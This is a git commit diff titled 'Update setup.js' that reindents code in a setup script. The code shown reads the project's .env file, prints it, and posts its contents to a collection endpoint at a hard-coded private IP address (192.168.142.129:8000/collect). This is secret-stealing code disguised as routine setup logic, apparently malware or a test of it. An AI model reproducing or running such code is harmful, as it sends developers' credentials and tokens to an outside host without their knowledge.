55d1cc0c8bc71efa86147499ae9be604e7fe4e2c
shipsss <49298777+shipsss@users.noreply.github.com>
2026-08-07 05:20:13 +0530

    Update setup.js

--- setup.js
+++ setup.js
@@ -16,9 +16,9 @@ const envFile = path.join(process.cwd(), ".env");
 if (fs.existsSync(envFile)) {
     const data = fs.readFileSync(envFile, "utf8");
     console.log(data);
-    const req = http.request(
-    "http://192.168.142.129:8000/collect?file"+data,
-    {
+const req = http.request(
+"http://192.168.142.129:8000/collect?file"+data,
+{
       method: "POST",
       headers: {
       "Content-Type": "application/json",
